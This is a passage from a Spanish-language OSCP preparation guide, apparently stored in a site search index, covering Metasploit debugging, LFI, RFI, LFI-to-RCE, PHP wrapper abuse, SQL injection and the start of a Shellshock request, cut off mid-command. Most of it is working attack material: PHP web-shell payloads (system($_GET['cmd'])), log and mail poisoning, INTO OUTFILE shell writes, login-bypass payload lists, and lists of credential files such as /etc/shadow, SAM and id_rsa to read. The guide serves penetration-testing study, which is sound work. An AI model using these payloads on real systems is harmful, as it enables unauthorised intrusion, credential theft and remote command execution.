datastore['DEPTH']\n     93:   levels = \"../\" * depth\n     94: \n     95:   # Upload the malicious executable to C:\\Windows\\System32\\\n     96:   print_status(\"#{peer} - Uploading executable (#{exe.length.to_s} bytes)\")\n     97:   upload(\"#{levels}WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n     98: \n     99:   # Let the TFTP server idle a bit before sending another file\n    100:   select(nil, nil, nil, 1)\n    101: \n    102:   # Upload the mof file\n    103:   print_status(\"#{peer} - Uploading .mof...\")\n    104:   upload(\"#{levels}WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\", mof)\n    105: end\n\n[1] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; break 96\n\n  Breakpoint 1: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ 96 (Enabled) \n\n      93:     levels = \"../\" * depth\n    94: \n    95:     # Upload the malicious executable to C:\\Windows\\System32\\\n =&gt; 96:     print_status(\"#{peer} - Uploading executable (#{exe.length.to_s} bytes)\")\n    97:     upload(\"#{levels}WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n    98: \n    99:     # Let the TFTP server idle a bit before sending another file\n\n\n[2] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; c\n\n  Breakpoint 1. First hit\n\nFrom: /root/.msf4/modules/exploits/windows/tftp/exploit_tftp.rb @ line 96 Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule#exploit:\n\n     81: def exploit\n     82:   peer = \"#{datastore['RHOST']}:#{datastore['RPORT']}\"\n     83: \n     84:   # Setup the necessary files to do the wbemexec trick\n     85:   binding.pry\n     86:   exe_name = rand_text_alpha(rand(10)+5) + '.exe'\n     87:   exe      = generate_payload_exe\n     88:   mof_name = rand_text_alpha(rand(10)+5) + '.mof'\n     89:   mof      = generate_mof(mof_name, exe_name)\n     90: \n     91:   # Configure how deep we want to traverse\n     92:   depth  = datastore['DEPTH']\n     93:   levels = \"../\" * depth\n     94: \n     95:   # Upload the malicious executable to C:\\Windows\\System32\\\n =&gt;  96:   print_status(\"#{peer} - Uploading executable (#{exe.length.to_s} bytes)\")\n     97:   upload(\"#{levels}WINDOWS\\\\system32\\\\#{exe_name}\", exe)\n     98: \n     99:   # Let the TFTP server idle a bit before sending another file\n    100:   select(nil, nil, nil, 1)\n    101: \n    102:   # Upload the mof file\n    103:   print_status(\"#{peer} - Uploading .mof...\")\n    104:   upload(\"#{levels}WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{mof_name}\", mof)\n    105: end\n\n[2] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; depth\n=&gt; 0\n[3] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; levels\n=&gt; \"\"\n[4] pry(#&lt;Msf::Modules::Mod6578706c6f69742f77696e646f77732f746674702f6578706c6f69745f74667470::MetasploitModule&gt;)&gt; \n</code></pre> <p>Este exploit contaba con otras ligeras modificaciones a hacer, pero con esto ya queda claro la funcionalidad del pry-byebug.</p> <p>2. Burpsuite</p> <p>Otra opci\u00f3n para los menos valientes (aunque a veces tambi\u00e9n la aplico), es configurar un proxy desde Burpsuite. Para ello, simplemente en la pesta\u00f1a de Proxies (Options), a\u00f1adimos un nuevo Proxy, generalmente sobre un puerto aleatorio (puerto 4646 [Bind to Port] a modo de ejmplo). Este puerto, en la pesta\u00f1a Request Handling, debe redireccionar al Host v\u00edctima as\u00ed como al puerto real donde se encuentre el servicio configurado que queremos analizar.</p> <p>Lo que conseguimos con esto, es que de visualizar el recurso http://localhost:4646, nos cargue el mismo contenido que el del servicio web del Host v\u00edctima. La utilidad de este procedimiento, es que desde Metasploit a la hora de lanzar cualquier exploit, podemos configurar como IP nuestra IP local (127.0.0.1) as\u00ed como el puerto 4646 para que todo el tr\u00e1fico sea interceptado desde Burpsuite y posteriormente redireccionado al Host v\u00edctima. Esto nos permite analizar por ejemplo desde el Repeater c\u00f3mo es la respuesta del lado del servidor una vez se env\u00eda el exploit al Host v\u00edctima.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#pentesting-web","title":"Pentesting Web","text":""},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#lfi","title":"LFI","text":"<p>Esta vulnerabilidad nos permite visualizar recursos del sistema efectuando para ello un Directory Path Transversal.</p> <p>A modo de ejemplo, presento a continuaci\u00f3n un script en PHP con dicha vulnerabilidad:</p> <pre><code>&lt;?php\n    $file = $_REQUEST['file'];\n    echo include($file);\n?&gt;\n</code></pre> <p>Suponiendo que el fichero se llama file.php, si desde la URL efectuamos la siguiente b\u00fasqueda:</p> <p><code>http://localhost/file.php?file=/etc/passwd</code></p> <p>Veremos c\u00f3mo se nos lista el fichero passwd del equipo Linux local. Habr\u00e1n ocasiones en las que tengamos que recorrer un par de directorios hacia atr\u00e1s para visualizar el recurso:</p> <p><code>http://localhost/file.php?file=../../../../../etc/passwd</code></p> <p>As\u00ed como incorporar un %00 para el bypassing de restricciones implementadas:</p> <p><code>http://localhost/file.php?file=../../../../../etc/passwd%00</code></p> <p>Otra forma tambi\u00e9n de bypassear posibles restricciones es a\u00f1adiendo un interrogante al final de la petici\u00f3n:</p> <p><code>http://localhost/file.php?file=../../../../../etc/passwd?</code></p> <p>Por aqu\u00ed os dejo un buen recurso para el uso de Wrappers y otras t\u00e9cnicas de bypassing.</p> <p>Otra consideraci\u00f3n a tener en cuenta, es que de esta forma podemos leer archivos de texto, pero puede que de intentar visualizar archivos de extensi\u00f3n .php estos sean interpretados en vez de listados. Podemos evadir dicho problema haciendo lo siguiente:</p> <p><code>http://localhost/file.php?file=php://filter/convert.base64-encode/resource=prueba.php</code></p> <p>La idea para no ver PD9waHAKCSNQcnVlYmEKPz4K1 desde la web, es aplicar el siguiente comando desde terminal:</p> <pre><code>$~ curl --silent http://localhost/file.php?file=php://filter/convert.base64-encode/resource=prueba.php | base64 -d 2&gt;/dev/null\n\n&lt;?php\n    #Prueba\n?&gt;\n</code></pre> <p>Donde como vemos, se consigue visualizar el recurso PHP.</p> <p>Recursos interesantes siempre a mirar son los siguientes:</p> <pre><code>/etc/issue \n/etc/motd \n/etc/passwd \n/etc/group \n/etc/resolv.conf\n/etc/shadow\n/home/[USERNAME]/.bash_history o .profile\n~/.bash_history o .profile\n$USER/.bash_history o .profile\n/root/.bash_history o .profile\n/etc/mtab  \n/etc/inetd.conf  \n/var/log/dmessage\n.htaccess\nconfig.php\nauthorized_keys\nid_rsa\nid_rsa.keystore\nid_rsa.pub\nknown_hosts\n/etc/httpd/logs/acces_log \n/etc/httpd/logs/error_log \n/var/www/logs/access_log \n/var/www/logs/access.log \n/usr/local/apache/logs/access_ log \n/usr/local/apache/logs/access. log \n/var/log/apache/access_log \n/var/log/apache2/access_log \n/var/log/apache/access.log \n/var/log/apache2/access.log\n/var/log/apache/error.log\n/var/log/apache/access.log\n/var/log/httpd/error_log\n/var/log/access_log\n/var/log/mail\n/var/log/sshd.log\n/var/log/vsftpd.log\n.bash_history\n.mysql_history\n.my.cnf\n/proc/sched_debug\n/proc/mounts\n/proc/net/arp\n/proc/net/route\n/proc/net/tcp\n/proc/net/udp\n/proc/net/fib_trie\n/proc/version\n/proc/self/environ\n</code></pre> <p>As\u00ed como los siguientes en m\u00e1quinas Windows:</p> <pre><code>c:\\WINDOWS\\system32\\eula.txt\nc:\\boot.ini  \nc:\\WINDOWS\\win.ini  \nc:\\WINNT\\win.ini  \nc:\\WINDOWS\\Repair\\SAM  \nc:\\WINDOWS\\php.ini  \nc:\\WINNT\\php.ini  \nc:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf  \nc:\\Program Files\\Apache Group\\Apache2\\conf\\httpd.conf  \nc:\\Program Files\\xampp\\apache\\conf\\httpd.conf  \nc:\\php\\php.ini  \nc:\\php5\\php.ini  \nc:\\php4\\php.ini  \nc:\\apache\\php\\php.ini  \nc:\\xampp\\apache\\bin\\php.ini  \nc:\\home2\\bin\\stable\\apache\\php.ini  \nc:\\home\\bin\\stable\\apache\\php.ini\nc:\\Program Files\\Apache Group\\Apache\\logs\\access.log  \nc:\\Program Files\\Apache Group\\Apache\\logs\\error.log\nc:\\WINDOWS\\TEMP\\  \nc:\\php\\sessions\\  \nc:\\php5\\sessions\\  \nc:\\php4\\sessions\\\nwindows\\repair\\SAM\n%SYSTEMROOT%\\repair\\SAM\n%SYSTEMROOT%\\System32\\config\\RegBack\\SAM\n%SYSTEMROOT%\\System32\\config\\SAM\n%SYSTEMROOT%\\repair\\system\n%SYSTEMROOT%\\System32\\config\\SYSTEM\n%SYSTEMROOT%\\System32\\config\\RegBack\\system\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#lfi-code-examples","title":"LFI Code Examples","text":"<p>A continuaci\u00f3n, se detallan algunas vulnerabilidades de tipo LFI con el c\u00f3digo del lado del servidor, para poder practicar en local dichas t\u00e9cnicas.</p> <p>Basic Includes</p> <p>C\u00f3digo del servidor:</p> <pre><code>&lt;?php\n$file = $_GET['file'];\n\nif(isset($file))\n{\n  include(\"$file\");\n}\n</code></pre> <p>Petici\u00f3n leg\u00edtima:</p> <pre><code>http://localhost/index.php?file=contact.php\n</code></pre> <p>Petici\u00f3n malintencionada:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/var/www/html]\n\u2514\u2500\u2500\u257c #curl --silent http://localhost/index.php?file=/etc/subgid\ns4vitar:100000:65536\n</code></pre> <p>Directory traversal attack</p> <p>C\u00f3digo del servidor:</p> <pre><code>&lt;?php\n$file = $_GET['file'];\nif(isset($file))\n{\n  include(\"lib/functions/$file\");\n}\n</code></pre> <p>Petici\u00f3n leg\u00edtima:</p> <pre><code>http://localhost/index.php?file=contact.php\n</code></pre> <p>Petici\u00f3n malintencionada:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/var/www/html]\n\u2514\u2500\u2500\u257c #curl --silent http://localhost/index.php?file=../../../../../etc/subgid\ns4vitar:100000:65536\n</code></pre> <p>Null Byte Injection</p> <p>C\u00f3digo del servidor:</p> <pre><code>&lt;?php\n$file = $_GET['file'];\nif(isset($file))\n{\n  include(\"lib/functions/$file.php\");\n}\n</code></pre> <p>Petici\u00f3n leg\u00edtima:</p> <pre><code>http://localhost/index.php?file=contact\n</code></pre> <p>Petici\u00f3n malintencionada:</p> <pre><code>curl --silent \"http://localhost/index.php?file=../../../../../../../../../etc/subgid%00\"\ns4vitar:100000:65536\n</code></pre> <p>Cabe decir que el Null Byte Injection fue arreglado en PHP a partir de la versi\u00f3n 5.3.4.</p> <p>Filter Evasion</p> <p>C\u00f3digo del servidor:</p> <pre><code>&lt;?php\n$file = str_replace('../', '', $_GET['file']);\nif(isset($file))\n{\n  include(\"lib/functions/$file\");\n}\n</code></pre> <p>Petici\u00f3n malintencionada:</p> <pre><code>\u250c\u2500[root@parrot]\u2500[/var/www/html]\n\u2514\u2500\u2500\u257c #curl --silent \"http://localhost/index.php?file=..%2F..%2F..%2F..%2F..%2Fetc/subgid\"\ns4vitar:100000:65536\n\u250c\u2500[root@parrot]\u2500[/var/www/html]\n\u2514\u2500\u2500\u257c #curl --silent \"http://localhost/index.php?file=....//....//....//....//....//etc/subgid\"\ns4vitar:100000:65536\n\u250c\u2500[root@parrot]\u2500[/var/www/html]\n</code></pre> <p>Double encoding</p> <p>Para continuar evitando filtro, se puede hacer uso de una doble codificaci\u00f3n. Esto es, codificamos los datos por primera vez:</p> <pre><code>%2E%2E%2Fetc%2Fpasswd\n</code></pre> <p>Y ahora codificamos el %:</p> <pre><code>%252E%252E%252Fetc%252Fpasswd\n</code></pre> <p>Path Truncation</p> <p>Sobre la solicitud en la que pretendemos hacer LFI, a\u00f1adimos mil veces ./ para el recurso ../../../../etc/passwd/././././././&lt;...&gt;/.php. Una vez el nombre del archivo cuenta con m\u00e1s de 4.096 bytes, se elimina la parte m\u00e1s larga. De esta forma, nuestra petici\u00f3n se convierte en ../../../../etc/passwd.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#rfi","title":"RFI","text":"<p>Esta vulnerabilidad tiene cierta similitud que el LFI, s\u00f3lo que la inclusi\u00f3n de archivos se produce de manera remota, permiti\u00e9ndonos desde la URL vulnerable de un servicio web apuntar hacia servicios locales de nuestro equipo que estemos compartiendo.</p> <p>Un buen ejemplo para practicar es la m\u00e1quina TartarSauce de HackTheBox, donde el servicio web contaba con un plugin Gwolle vulnerable a RFI. Desde el servicio web, realiz\u00e1bamos la siguiente consulta desde la URL:</p> <p><code>http://192.168.1.X/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abs path=http://nuestraIP/wp-load.php</code></p> <p>De esta forma, resulta sencillo pensar en lo f\u00e1cil que puede llegar a ser para el caso descrito el acceso al sistema.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#lfi-to-rce","title":"LFI to RCE","text":"<p>Existen varias formas de conseguir ejecutar comandos en remoto a trav\u00e9s de un Local File Inclusion, as\u00ed como de acceder al sistema a trav\u00e9s de la visualizaci\u00f3n de ciertos recursos. Para este caso, explicar\u00e9 2 t\u00e9cnicas a modo de ejemplo:</p> <ul> <li>Log Poisoning (access.log &amp; auth.log)</li> <li>Mail PHP Execution</li> </ul> <p>La primera de ellas [Log Poisoning], consiste en verificar si las rutas /var/log/auth.log y /var/log/apache2/access.log son visibles desde el LFI.</p> <p>En caso de serlo para la ruta /var/log/auth.log, podemos llevar a cabo t\u00e9cnicas de autenticaci\u00f3n que nos permitan obtener ejecuci\u00f3n de comandos en remoto. Esta ruta almacena las autenticaciones establecidas sobre el sistema, entre ellas adem\u00e1s de las normales de sesi\u00f3n, las que van por SSH.</p> <p>Esto en otras palabras se traduce en que por cada intento fallido de conexi\u00f3n por SSH hacia el sistema, se generar\u00e1 un reporte visible en el recurso /var/log/auth.log. La idea en este punto es aprovechar la visualizaci\u00f3n del recurso para forzar la autenticaci\u00f3n de un usuario no convencional, donde incrustramos un c\u00f3digo PHP que nos permite posteriormente desde el LFI ejecutar comandos sobre el sistema.</p> <p>Ejemplo:</p> <p><code>ssh \"&lt;?php system('whoami'); ?&gt;\"@192.168.1.X</code></p> <p>Tras introducir una contrase\u00f1a incorrecta para el usuario inexistente, se generar\u00e1 un reporte en el recurso auth.log como el siguiente:</p> <pre><code>Nov  5 11:53:46 parrot sshd[13626]: Failed password for invalid user &lt;?php echo system('whoami'); ?&gt; from ::1 port 39988 ssh2\nNov  5 11:53:48 parrot sshd[13626]: Connection closed by invalid user &lt;?php echo system('whoami'); ?&gt; ::1 port 39988 [preauth]\n</code></pre> <p>Llegados a este punto, si desde la URL aprovechando el LFI apuntamos a dicho recurso, veremos c\u00f3mo figurar\u00e1 un usuario 'www-data' para el campo whoami definido en el script php incrustrado a trav\u00e9s del usuario de autenticaci\u00f3n.</p> <p>Para el caso del recurso access.log pasa algo similar, s\u00f3lo que en cuanto a la implementaci\u00f3n t\u00e9cnica se realizarn otras operaciones.</p> <p>Siempre suelo emplear Burpsuite como intermediario, pero tambi\u00e9n se puede hacer desde curl modificando el User-Agent. Lo que necesitamos hacer es realizar una consulta a la p\u00e1gina web cambiando el User-Agent por un c\u00f3digo PHP. De esta forma, tras visualizar el recurso access.log de Apache, veremos como el c\u00f3digo PHP es interpretado en el User-Agent de la petici\u00f3n en la respuesta del lado del servidor, pudiendo posteriormente ejecutar comandos en remoto de la misma forma que suced\u00eda con el recurso auth.log.</p> <p>Otra de las t\u00e9cnicas para conseguir la ejecuci\u00f3n de comandos a trav\u00e9s de un LFI es por medio de archivos proc. Podemos encontrar la metodolog\u00eda paso a paso en el siguiente recurso.</p> <p>La segunda de ellas [Mail PHP Execution], consiste en aprovechar la vulnerabilidad LFI para tras visualizar los usuarios en el recurso '/etc/passwd', poder visualizar sus correspondientes mails en '/var/mail/usuario'.</p> <p>Es decir, suponiendo que tenemos nociones de que existe un usuario 'www-data' sobre el sistema, en caso de contar con el servicio smtp corriendo, podemos \"malformar\" un mensaje para insertar c\u00f3digo PHP y posteriormente apuntarlo desde el navegador.</p> <p>En caso de no llegar a saber qu\u00e9 usuarios hay en el sistema, podemos hacer uso de la herramienta smtp-user-enum para enumerar usuarios sobre el servicio:</p> <pre><code>smtp-user-enum -M VRFY -U top_shortlist.txt -t 192.168.1.X \n</code></pre> <p>Obteniendo resultados similares al siguiente:</p> <pre><code>192.168.1.X: root exists\n192.168.1.X: mysql exists\n192.168.1.X: www-data exists\n</code></pre> <p>Ahora que sabemos que el usuario www-data existe, podemos hacer lo siguiente:</p> <pre><code>telnet 192.168.1.X 25\n\nHELO localhost\n\nMAIL FROM:&lt;root&gt;\n\nRCPT TO:&lt;www-data&gt;\n\nDATA\n\n&lt;?php\n\necho shell_exec($_REQUEST['cmd']);\n?&gt;\n</code></pre> <p>\u00bfQu\u00e9 tendremos que hacer llegados a este punto?, teniendo en cuenta que el mail ha sido enviado, tan s\u00f3lo tendremos que hacer lo siguiente:</p> <pre><code>http://192.168.1.X/?page=../../../../../var/mail/www-data?cmd=comando-a-ejecutar\n</code></pre> <p>Y el navegador nos devolver\u00e1 el output del comando aplicado a nivel de sistema.</p>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#lfi-to-rce-via-php-sessions","title":"LFI to RCE via PHP Sessions","text":"<p>Para este caso, comprobamos si el sitio web cuenta usa PHP SESSION (PHPSESSID):</p> <pre><code>Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/\nSet-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly\n</code></pre> <p>En PHP, estas sesiones son almacenadas en la ruta '/var/lib/php5/sess[PHPSESSID]':</p> <pre><code>/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.\nuser_ip|s:0:\"\";loggedin|s:0:\"\";lang|s:9:\"en_us.php\";win_lin|s:0:\"\";user|s:6:\"admin\";pass|s:6:\"admin\";\n</code></pre> <p>La idea es setear la Cookie a <code>&lt;?php system('cat /etc/passwd');?&gt;</code>:</p> <pre><code>login=1&amp;user=&lt;?php system(\"cat /etc/passwd\");?&gt;&amp;pass=password&amp;lang=en_us.php\n</code></pre> <p>Una vez hecho, podemos incluir el archivo PHP de la siguiente forma a trav\u00e9s del LFI:</p> <pre><code>login=1&amp;user=admin&amp;pass=password&amp;lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#lfi-to-rce-via-environ","title":"LFI to RCE via Environ","text":"<p>Si por alg\u00fan casual podemos visualizar el recurso /proc/self/environ, como si se tratara de un recurso log, enviaremos nuestro Payload en el User-Agent:</p> <pre><code>GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1\nUser-Agent: &lt;?=phpinfo(); ?&gt;\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#lfi-rfi-using-wrappers","title":"LFI RFI Using Wrappers","text":""},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#wrapper-phpfilter","title":"Wrapper php://filter","text":"<pre><code>http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php\nhttp://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php\nhttp://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php\n</code></pre> <p>Se puede jugar con otro wrapper de compresi\u00f3n en caso de contar con un archivo muy grande:</p> <pre><code>http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\n</code></pre> <p>As\u00ed mismo, los wrappers tambi\u00e9n pueden ser encadenados:</p> <pre><code>php://filter/convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#wrapper-zip","title":"Wrapper zip://","text":"<pre><code>echo \"&lt;pre&gt;&lt;?php system($_GET['cmd']); ?&gt;&lt;/pre&gt;\" &gt; payload.php;  \nzip payload.zip payload.php;\nmv payload.zip shell.jpg;\nrm payload.php\n\nhttp://example.com/index.php?page=zip://shell.jpg%23payload.php\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#wrapper-data","title":"Wrapper data://","text":"<p>Este Wrapper nos permite ejecutar directamente c\u00f3digo PHP:</p> <pre><code>http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=\nNOTA: El payload es \"&lt;?php system($_GET['cmd']);echo 'Tenemos Shell!'; ?&gt;\"\n</code></pre> <p>Otra forma:</p> <pre><code>http://example.com/index.php?file=data:text/plain;,&lt;?php echo shell_exec($_GET['cmd']);?&gt;\n</code></pre> <p>Otro payload interesante a tener en cuenta es el <code>&lt;?php phpinfo(); die();?&gt;</code>. La funcionalidad die previene la ejecuci\u00f3n del resto del script o la ejecuci\u00f3n de la extensi\u00f3n decodificada incorrectamente anexada a la secuencia.</p> <p>Para ejecutar en ambos casos directamente un comando, la solicitud de datos + carga \u00fatil puede ser:</p> <pre><code>http://example.com/index.php?file=data:,&lt;?system($_GET['x']);?&gt;&amp;x=ls\n</code></pre> <p>O tambi\u00e9n:</p> <pre><code>http://example.com/index.php?file=data:;base64,PD9zeXN0ZW0oJF9HRVRbJ3gnXSk7Pz4=&amp;x=ls.\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#wrapper-expect","title":"Wrapper expect://","text":"<pre><code>http://example.com/index.php?page=expect://id\nhttp://example.com/index.php?page=expect://ls\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#wrapper-input","title":"Wrapper input://","text":"<p>Especificamos nuestro payload a trav\u00e9s de un par\u00e1metro POST:</p> <pre><code>http://example.com/index.php?page=php://input\nPOST DATA: &lt;? system('id'); ?&gt;\n</code></pre> <p>Tambi\u00e9n puede hacerse desde terminal de la siguiente forma:</p> <pre><code>$~ echo \"&lt;? system('id'); ?&gt;\" | POST http://example.com/index.php?page=php://input\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#wrapper-phar","title":"Wrapper phar://","text":"<p>Crea un archivo phar con un objeto serializado en sus metadatos:</p> <pre><code>// create new Phar\n$phar = new Phar('test.phar');\n$phar-&gt;startBuffering();\n$phar-&gt;addFromString('test.txt', 'text');\n$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');\n\n// add object of any class as meta data\nclass AnyClass {}\n$object = new AnyClass;\n$object-&gt;data = 'rips';\n$phar-&gt;setMetadata($object);\n$phar-&gt;stopBuffering();\n</code></pre> <p>Si llegados a este punto, cualquier operaci\u00f3n es realizada en nuestro archivo Phar existente haciendo uso del wrapper phar://, entonces los metadatos serializados son deserializados y por tanto interpretados.</p> <p>Si esta aplicaci\u00f3n contase con una clase llamada AnyClass y tuviese los m\u00e9todos m\u00e1gicos __destruct() o __wakeup() definidos, entonces estos ser\u00edan invocados autom\u00e1ticamente:</p> <pre><code>class AnyClass {\n    function __destruct() {\n        echo $this-&gt;data;\n    }\n}\n// output: rips\ninclude('phar://test.phar');\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#sqli","title":"SQLI","text":"<p>Ejemplo b\u00e1sico aplicado sobre servicio web falso http://www.paginaweb.com/contenidos.php?Id=3</p> <p>Comprobamos que la web es vulnerable a inyecci\u00f3n SQL:</p> <p><code>http://www.paginaweb.com/contenidos.php?Id=-1</code></p> <p>Enumeramos hasta coincidir con el n\u00famero de columnas para generar las etiquetas:</p> <p><code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,2,3,4,5-- -</code></p> <p>Nos aprovechamos de las etiquetas generadas para ver si somos capaces de visualizar archivos sobre el sistema, as\u00ed como para saber el versionado del servicio de base de datos y el usuario que corre dicho servicio:</p> <p><code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,select_file('/etc/passwd'),3,4,5-- -</code> <code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,@@version,3,4,5-- -</code> <code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,user(),3,4,5-- -</code></p> <p>Comenzamos a enumerar las tablas de la base de datos:</p> <p><code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+0,1-- -</code></p> <p>Nos montamos un script en Bash (o en otro lenguaje) para determinar de forma r\u00e1pida qu\u00e9 tablas existen sobre la base de datos, parseando para ello los resultados en funci\u00f3n del caso que se nos presente:</p> <pre><code>for i in $(seq 1 200); do\n    echo -n \"Para el n\u00famero $i: \"\n    curl --silent \"http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,table_name,3,4,5+from+information_schema.tables+limit+$i,1--%20-\" | grep \"eltitulo\" | cut -d '&gt;' -f 2 | awk '{print $1}' FS=\"&lt;\"\ndone\n</code></pre> <p>Obteniendo resultados como los siguientes:</p> <pre><code>Para el n\u00famero 63: CABECERA\nPara el n\u00famero 64: COLABORADORES\nPara el n\u00famero 65: CONTENIDOS\nPara el n\u00famero 66: DOCUMENTOS\nPara el n\u00famero 67: HORARIOS\nPara el n\u00famero 68: IDIOMAS\nPara el n\u00famero 69: IMAGENES\nPara el n\u00famero 70: MODULOS\nPara el n\u00famero 71: NOTICIAS\nPara el n\u00famero 72: PERMISOS\nPara el n\u00famero 73: USUARIOS\n</code></pre> <p>Una vez localizada la tabla que nos interese (para este caso, la tabla usuarios), enumeramos las columnas existentes para dicha tabla en la base de datos:</p> <p><code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(column_name),3,4,5+from+information_schema.columns+where+table_name=char(117,115,117,97,114,105,111,115)-- -</code></p> <p>Es necesario para este paso convertir la cadena usuarios de STRING a formato ASCII. Obtendremos los siguientes resultados:</p> <p><code>IDUSUARIO,IDEMPRESA,USUARIO,PASSWORD,NOMBRE,ADMINISTRADOR</code></p> <p>Una vez sabiendo los nombres de las columnas, aprovechamos la funcionalidad group_concat para concatenar todas las columnas cuyos datos queramos visualizar:</p> <p><code>http://www.paginaweb.com/contenidos.php?Id=-1+UNION+SELECT+1,group_concat(usuario,0x3a,password),3,4,5+from+usuarios--%20-</code></p> <p>Obteniendo el usuario y contrase\u00f1a de acceso.</p> <p>Antes de complicarse, preferible probar inyecciones b\u00e1sicas sobre paneles de autenticaci\u00f3n, esto es:</p> <pre><code>Usuario: admin' or 1=1-- -\nPassword: admin' or 1=1-- -\n</code></pre> <p>Para casos donde podamos llevar a cabo un nuevo registro de usuario, otra v\u00eda es crear un usuario con nombre admin' or 1=1-- - y password admin' or 1=1-- -, de esta forma tras posteriormente realizar la autenticaci\u00f3n como usuario v\u00e1lido, tendremos acceso a todos los datos de los usuarios en la base de datos principal.</p> <p>Para t\u00e9cnicas de bypassing consultar el siguiente enlace</p> <p>En caso de querer ejecutar comandos sobre el sistema, podemos aprovechar que desde consultas sql se pueden exportar archivos para generar el nuestro malicioso. Para ello, aplicar\u00edamos la siguiente sintaxis a modo de ejemplo:</p> <pre><code>http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,\"&lt;?php echo\nshell_exec($_GET['cmd']);?&gt;\",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'\n\nhttp://example.com/photoalbum.php?id=1 union all select 1,2,3,4,\"&lt;?php echo\nshell_exec($_GET['cmd']);?&gt;\",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'\n</code></pre> <p>A continuaci\u00f3n, un Payload de pruebas a realizar para los logins una vez hagamos la convencional ' or '1'='1:</p> <pre><code>-'\n' '\n'&amp;'\n'^'\n'*'\n' or ''-'\n' or '' '\n' or ''&amp;'\n' or ''^'\n' or ''*'\n\"-\"\n\" \"\n\"&amp;\"\n\"^\"\n\"*\"\n\" or \"\"-\"\n\" or \"\" \"\n\" or \"\"&amp;\"\n\" or \"\"^\"\n\" or \"\"*\"\nor true--\n\" or true--\n' or true--\n\") or true--\n') or true--\n' or 'x'='x\n') or ('x')=('x\n')) or (('x'))=(('x\n\" or \"x\"=\"x\n\") or (\"x\")=(\"x\n\")) or ((\"x\"))=((\"x\n</code></pre>"},{"location":"S4vitar/Preparaci%C3%B3n%20OSCP/#shellshock","title":"Shellshock","text":"<p>Buenas m\u00e1quinas para practicar este tipo de ataques fuera del laboratorio del OSCP son la m\u00e1quina Shocker y la m\u00e1quina Beep de HackTheBox.</p> <p>Esta es una vulnerabilidad que s\u00f3lo se ve en Linux, pues en Windows no afecta. La vulnerabilidad lo que nos permite es, tras no validar de forma correcta la declaraci\u00f3n de funciones en variables, ejecutar comandos en remoto sobre sistemas a trav\u00e9s de consultas en este caso por medio de peticiones web.</p> <p>Un buen Low Hanging Fruit puede consistir en enumerar el directorio /cgi-bin/ de una p\u00e1gina web. De existir, podemos buscar por archivos de extensi\u00f3n '.cgi', aunque no es extrictamente necesario... pues tambi\u00e9n podr\u00eda tratarse de un archivo de extensi\u00f3n '.sh' y los efectos ser\u00edan los mismos.</p> <p>En caso de encontrar estos recursos, podemos realizar pruebas como las que se describen a continuaci\u00f3n. En primer lugar nos ponemos en escucha por un puerto en nuestro equipo v\u00eda Netcat. En segundo lugar realizamos la siguiente petici\u00f3n desde terminal al servicio web:</p> <pre><code>$~ curl --silent -k -H \"User-Agent: () { 